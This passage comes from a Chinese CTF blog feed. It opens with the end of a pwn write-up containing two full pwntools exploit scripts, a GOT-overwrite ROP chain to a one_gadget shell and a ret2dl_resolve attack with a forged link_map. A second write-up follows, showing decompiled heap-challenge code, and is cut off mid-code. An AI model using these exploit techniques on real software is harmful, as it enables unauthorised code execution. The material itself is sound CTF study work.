RELRO且NO PIE，可以直接通过修改got表地址的低五位，定位到one_gadget</p><ol><li><p>利用csu2的gadget2控制寄存器<strong>rbx为read_got到one_gadget的偏移，rbp为read_got+0x3d</strong></p><p><code>pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret</code></p></li><li><p>错位获取gadget，通过rbp定位read_got，设置为one_gadget地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ROPgadget --binary ./pwn | grep <span class="hljs-string">&#x27;add&#x27;</span></span><br>0x000000000040117c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret<br></code></pre></td></tr></table></figure></li><li><p>调用read函数</p></li></ol><p><strong>套ret2dl_resolve模板，这个模板构造很繁琐，涉及动态链接的相关东西，学习一下</strong></p><h2 id="exp1-easy"><a href="#exp1-easy" class="headerlink" title="exp1-easy"></a>exp1-easy</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="hljs-comment">#context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;</span><br><br>libc = cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>banary = <span class="hljs-string">&quot;./pwn&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><span class="hljs-comment">#------------------------   ----------------------------</span><br>base_1 =  <span class="hljs-string">&quot;V2VsY29tZSB0byBOS0NURiE=&quot;</span><br>base_2 =  <span class="hljs-string">&quot;dGVsbCB5b3UgYSBzZWNyZXQ6&quot;</span><br>base_3 =  <span class="hljs-string">&quot;SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45&quot;</span><br>base_4 =  <span class="hljs-string">&quot;Y2FuIHlvdSBmaW5kIG1lPw==&quot;</span><br><br>s(base_1)<br>sleep(<span class="hljs-number">0.1</span>)<br>s(base_2)<br>sleep(<span class="hljs-number">0.1</span>)<br>s(base_3)    <br>sleep(<span class="hljs-number">0.1</span>)<br>s(base_4)<br>sleep(<span class="hljs-number">0.1</span>)<br><span class="hljs-comment">#------------------------   ----------------------------    </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"># .text:000000000040167A                 pop     rbx</span><br><span class="hljs-string"># .text:000000000040167B                 pop     rbp</span><br><span class="hljs-string"># .text:000000000040167C                 pop     r12</span><br><span class="hljs-string"># .text:000000000040167E                 pop     r13</span><br><span class="hljs-string"># .text:0000000000401680                 pop     r14</span><br><span class="hljs-string"># .text:0000000000401682                 pop     r15</span><br><span class="hljs-string"># .text:0000000000401684                 ret</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>pop_rbx_p5 = <span class="hljs-number">0x40167A</span> <span class="hljs-comment">#csu_gadget2</span><br><br>change_read = <span class="hljs-number">0x000000000040117c</span> <span class="hljs-comment">#add [rbp - 0x3d], ebx; nop; ret</span><br><br>read_got = <span class="hljs-number">0x404028</span> <span class="hljs-comment">#read.got</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">   0x7f7885fa6afe &lt;execvpe+638&gt;:mov    rdx,r12  #rdx=0</span><br><span class="hljs-string">   0x7f7885fa6b01 &lt;execvpe+641&gt;:mov    rsi,r15 #rsi=0</span><br><span class="hljs-string">   0x7f7885fa6b04 &lt;execvpe+644&gt;:lea    rdi,[rip+0xd0ab2]        #rdi=&quot;/bin/sh&quot;</span><br><span class="hljs-string">   0x7f7885fa6b0b &lt;execvpe+651&gt;:call   0x7f7885fa6170 &lt;execve&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>offset = <span class="hljs-number">0xFFFFFFFFFFFD5B3E</span>  <br><br>call_read = <span class="hljs-number">0x40146E</span><br>debug()<br><br><span class="hljs-comment">#read_got:  0x00007f7885fd0fc0</span><br><span class="hljs-comment">#After add: 0x00007f7885fa6afe --&gt; execvpe+638</span><br><br><br>payload =  <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">48</span> + p64(read_got+<span class="hljs-number">0x3d</span>) <span class="hljs-comment">#rbp-&gt;read_got+0x3d</span><br>payload += p64(pop_rbx_p5) + p64(offset) + p64(read_got+<span class="hljs-number">0x3d</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <br>payload += p64(change_read) <span class="hljs-comment">#set [rbp - 0x3d] to execvpe+638</span><br>payload += p64(call_read) <br><br>sl(payload)<br><br>pi()<br></code></pre></td></tr></table></figure><h2 id="exp2-ret2dl-reslove"><a href="#exp2-ret2dl-reslove" class="headerlink" title="exp2-ret2dl_reslove"></a>exp2-ret2dl_reslove</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="hljs-comment">#context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>banary = <span class="hljs-string">&quot;./pwn&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><span class="hljs-comment">#------------------------   ----------------------------</span><br>base_1 =  <span class="hljs-string">&quot;V2VsY29tZSB0byBOS0NURiE=&quot;</span><br>base_2 =  <span class="hljs-string">&quot;dGVsbCB5b3UgYSBzZWNyZXQ6&quot;</span><br>base_3 =  <span class="hljs-string">&quot;SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45&quot;</span><br>base_4 =  <span class="hljs-string">&quot;Y2FuIHlvdSBmaW5kIG1lPw==&quot;</span><br><br>s(base_1)<br>sleep(<span class="hljs-number">0.1</span>)<br>s(base_2)<br>sleep(<span class="hljs-number">0.1</span>)<br>s(base_3)    <br>sleep(<span class="hljs-number">0.1</span>)<br>s(base_4)<br>sleep(<span class="hljs-number">0.1</span>)<br><br><span class="hljs-comment">#------------------------ ret2dl_resolve  ----------------------------</span><br>read_plt = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br><br>read_addr = <span class="hljs-number">0x4013C4</span><br>pop_rdi = <span class="hljs-number">0x401683</span>  <br>pop_rsi = <span class="hljs-number">0x401681</span>   <span class="hljs-comment">#pop rsi ; pop r15 ; ret</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.plt:0000000000401026 F2 FF 25 E3 2F 00 00          bnd jmp cs:qword_404010</span><br><span class="hljs-string">.plt:0000000000401026</span><br><span class="hljs-string">.plt:0000000000401026                               sub_401020 endp</span><br><span class="hljs-string">.plt:0000000000401026</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>plt_load = <span class="hljs-number">0x0000000000401026</span><br><br>bss = <span class="hljs-number">0x404060</span> <br>link_map_addr = bss + <span class="hljs-number">0x100</span><br>l_addr = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>r_offset = link_map_addr - l_addr<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Fake_Link_map</span>(<span class="hljs-params">link_map_addr, l_addr, st_value</span>):<br>    <span class="hljs-comment">#fake_pointer_addr</span><br>    fake_dyn_STR_addr = p64(link_map_addr)<br>    fake_dyn_JMPREL_addr = p64(link_map_addr+<span class="hljs-number">0x8</span>)<br>    fake_rela_addr = link_map_addr+<span class="hljs-number">0x18</span><br>    fake_dyn_SYM_addr = p64(link_map_addr+<span class="hljs-number">0x30</span>)<br>    <br>    <span class="hljs-comment">#fake_structure</span><br>    fake_dyn_JMPREL = p64(<span class="hljs-number">0</span>) + p64(fake_rela_addr)<br>    fake_rela = p64(r_offset) + p64(<span class="hljs-number">0x7</span>) + p64(<span class="hljs-number">0</span>)<br>    fake_dyn_SYM = p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0xffffffff</span>) + p64(st_value-<span class="hljs-number">0x8</span>) + p64(<span class="hljs-number">0</span>)<br>    <br>    <br>    <span class="hljs-comment">#fake_link_map</span><br>    link_map =  p64(l_addr&amp;(<span class="hljs-number">2</span>**<span class="hljs-number">64</span>-<span class="hljs-number">1</span>))<br>    link_map += fake_dyn_JMPREL   <span class="hljs-comment"># 0x8     </span><br>    link_map += fake_rela<span class="hljs-comment"># 0x18</span><br>    link_map += fake_dyn_SYM      <span class="hljs-comment"># 0x30</span><br>    link_map += <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x20</span>        <span class="hljs-comment"># 0x40</span><br>    link_map += fake_dyn_STR_addr    <span class="hljs-comment"># STRTAB link_map_addr +0x68</span><br>    link_map += fake_dyn_SYM_addr   <span class="hljs-comment"># SYMTAB link_map_addr +0x70</span><br>    link_map += <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br>    link_map += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x78</span> <br>    link_map += fake_dyn_JMPREL_addr  <span class="hljs-comment"># JMPREL link_map_addr +0xf8        </span><br>    <br>    <span class="hljs-keyword">return</span> link_map<br><br>debug()<br>payload =  <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> <br>payload += p64(pop_rsi) + p64(link_map_addr) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(read_plt)  <span class="hljs-comment">#read1: read_fake_link_map</span><br>payload += p64(read_addr) <span class="hljs-comment">#read2: ret2dl_reslove </span><br>sl(payload)<br><br><br>fake_link_map = Fake_Link_map(link_map_addr, l_addr, read_got)<br>pause()<br>sl(fake_link_map)<br><br><span class="hljs-comment">#ret2dl_reslove</span><br>ROP =  <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span> <br>ROP += p64(pop_rdi) + p64(link_map_addr + <span class="hljs-number">0x78</span>) + p64(plt_load) <span class="hljs-comment">#plt-&gt;got-&gt;read_got</span><br>ROP += p64(link_map_addr) + p64(<span class="hljs-number">0</span>)<br>pause()<br>sl(ROP)<br><br><br>pi()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pwnhub三月赛+铁三heap2019</title>
    <link href="/2023/03/18/Pwnhub-%E4%B8%89%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/03/18/Pwnhub-%E4%B8%89%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="1-sh-v1-1"><a href="#1-sh-v1-1" class="headerlink" title="1. sh_v1_1"></a>1. sh_v1_1</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">commnd</span><br>ls<br><br>cat<br><br>cp #复制文件<br><br>ln #创建链接<br><br>touch #创建文件并写入,文件数max==79<br>gedit #修改文件并写入<br>rm    #删除文件<br></code></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>程序里面有很多脏东西，去除那些乱七八糟的东西，再看主要内容</p><h4 id="main"><a href="#main" class="headerlink" title="main"></a><strong>main</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  init_0();<br>  start_0(a1, a2);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;&gt;&gt;&gt;&quot;</span>);<br>    read_0();<br>    Commnd();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="start"><a href="#start" class="headerlink" title="start"></a><strong>start</strong></h4><p>在该函数中，将文件标识全部置0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">79</span>; ++i )<br>&#123;<br>  *((_QWORD *)&amp;unk_A0C0 + <span class="hljs-number">6</span> * i) = <span class="hljs-number">0LL</span>;<br>  qword_A0E8[<span class="hljs-number">6</span> * i] = <span class="hljs-number">0LL</span>;<br>  *((_QWORD *)&amp;unk_A0C0 + <span class="hljs-number">6</span> * i + <span class="hljs-number">1</span>) = <span class="hljs-string">&#x27;modeerf&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="read-0"><a href="#read-0" class="headerlink" title="read_0"></a>read_0</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">v9 = __readfsqword(<span class="hljs-number">0x28</span>u);<br><span class="hljs-built_in">strcpy</span>(delim, <span class="hljs-string">&quot; &quot;</span>);<br>*(_QWORD *)s = <span class="hljs-number">0LL</span>;<br>v6 = <span class="hljs-number">0LL</span>;<br>v7 = <span class="hljs-number">0LL</span>;<br>v8 = <span class="hljs-number">0LL</span>;<br><br>*(_QWORD *)s1 = qword_A0A0;<br>*(_QWORD *)src = qword_A0A0;<br>result = qword_A0A0;<br><br>read_line(s, <span class="hljs-number">32LL</span>);<br>src = strtok(s, delim);<br><br><span class="hljs-built_in">strcpy</span>(s1, src);<br>srca = strtok(<span class="hljs-number">0LL</span>, delim);<br><span class="hljs-keyword">if</span> ( !srca )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br><span class="hljs-built_in">strcpy</span>(::src, srca);<br>srcb = strtok(<span class="hljs-number">0LL</span>, delim);<br><span class="hljs-keyword">if</span> ( !srcb )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br><br><span class="hljs-built_in">strcpy</span>(qword_A090, srcb);<br></code></pre></td></tr></table></figure><h4 id="Commnd"><a href="#Commnd" class="headerlink" title="Commnd"></a>Commnd</h4><p>感觉像个菜单堆题…</p><h5 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h5><p><strong>cp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">79</span>; ++m )<br><br><br><span class="hljs-built_in">strncpy</span>((<span class="hljs-type">char</span> *)qword_A0E8[<span class="hljs-number">6</span> * m], (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)qword_A0E8[<span class="hljs-number">0</span>], <span class="hljs-number">0x208</span>uLL);<br><br> <span class="hljs-keyword">for</span> ( n = <span class="hljs-number">0</span>; ; ++n )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( n &gt; <span class="hljs-number">79</span> )<br>          <span class="hljs-keyword">goto</span> LABEL_807;<br>        <span class="hljs-keyword">if</span> ( !*((_QWORD *)&amp;unk_A0C0 + <span class="hljs-number">6</span> * n) )<br>          <span class="hljs-keyword">break</span>;<br>      &#125;<br>          <br>*((_QWORD *)&amp;unk_A0C0 + <span class="hljs-number">6</span> * n) = <span class="hljs-number">1LL</span>;<br>          <br>qword_A0E8[<span class="hljs-number">6</span> * n] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x208</span>uLL);<br><br><span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span> *)&amp;unk_A0C0 + <span class="hljs-number">48</span> * n + <span class="hljs-number">8</span>, qword_A090);<br><br><span class="hljs-built_in">strncpy</span>((<span class="hljs-type">char</span> *)qword_A0E8[<span class="hljs-number">6</span> * n], (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)qword_A0E8[<span class="hljs-number">0</span>], <span class="hljs-number">0x208</span>uLL);<br></code></pre></td></tr></table></figure><p><strong>ln</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( kk = <span class="hljs-number">0</span>; ; ++kk )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( kk &gt; <span class="hljs-number">79</span> )<br>        <br><span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span> *)&amp;unk_A0C0 + <span class="hljs-number">48</span> * mm + <span class="hljs-number">8</span>, qword_A090);<br>*((_QWORD *)&amp;unk_A0C0 + <span class="hljs-number">6</span> * mm) = <span class="hljs-number">1LL</span>;<br>qword_A0E8[<span class="hljs-number">6</span> * mm] = qword_A0E8[<span class="hljs-number">6</span> * kk];<br></code></pre></td></tr></table></figure><p><strong>ls</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//ls命令中，i为文件数，输出文件名</span><br><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">79</span>; ++i )<br>&#123;<br>    <span class="hljs-keyword">if</span> ( *((_QWORD *)&amp;unk_A0C0 + <span class="hljs-number">6</span> * i) == <span class="hljs-number">1LL</span> )<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s &quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;unk_A0C0 + <span class="hljs-number">48</span> * i + <span class="hljs-number">8</span>);<br>&#125;<br><span class="hljs-built_in">putchar</span>(<span class="hljs-number">10</span>);<br></code></pre></td></tr></table></figure><h5 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h5><p><strong>touch</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt;= <span class="hljs-number">79</span>; ++k )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( !*((_QWORD *)&amp;unk_A0C0 + <span class="hljs-number">6</span> * k) )<br>        &#123;<br>          *((_QWORD *)&amp;unk_A0C0 + <span class="hljs-number">6</span> * k) = <span class="hljs-number">1LL</span>;<br>          qword_A0E8[<span class="hljs-number">6</span> * k] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x208</span>uLL);<br>          read_line(qword_A0E8[<span class="hljs-number">6</span> * k], <span class="hljs-number">0x208</span>uLL);  <span class="hljs-comment">//off-by-null??</span><br>          <span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span> *)&amp;unk_A0C0 + <span class="hljs-number">48</span> * k + <span class="hljs-number">8</span>, src);<br>          <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>        &#125;<br>      &#125;<br>LABEL_807:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Maximum number of files. Please delete the file.&quot;</span>);<br>      <span 